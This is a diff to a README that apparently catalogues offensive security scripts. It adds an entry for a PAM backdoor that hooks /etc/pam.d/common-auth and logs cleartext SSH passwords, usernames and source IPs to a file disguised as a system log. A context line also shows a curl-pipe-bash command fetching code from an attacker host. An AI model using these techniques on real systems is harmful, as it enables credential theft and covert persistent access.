@@ -234,6 +234,21 @@ curl -sSL http://attacker.com/x | bash
 python3 sammy.py <ldb_file>
 ```
 
+## [ssh-pam-backdoor.sh](./ssh-pam-backdoor.sh) - PAM Backdoor for Logging Cleartext SSH Passwords
+
+This script hooks into the PAM stack, logging **cleartext passwords** from successful SSH logins. It modifies the PAM configuration to capture and store credentials in a custom log file.
+
+#### Features:
+- **Cleartext Password Logging**: Logs plain text passwords from successful SSH authentications.
+- **PAM Integration**: Injects itself into `/etc/pam.d/common-auth` to capture SSH login attempts.
+- **Log Storage**: Logs data, including username, password, and remote IP to `/var/log/auth.1.log`.
+
+#### Example Log:
+```bash
+Thu Oct 19 12:34:56 UTC 2023 akaza, InfinityCaslte123!, From: 201.231.155.21
+```
+
+
 ## [subb.py](./subb.py) - Quick V-Host Enumeration and Subdomain Discovery
 
 `subb.py` can quickly find virtual hosts (vhosts) for a given domain by either using a provided wordlist or generating a custom list of keywords using CeWL.
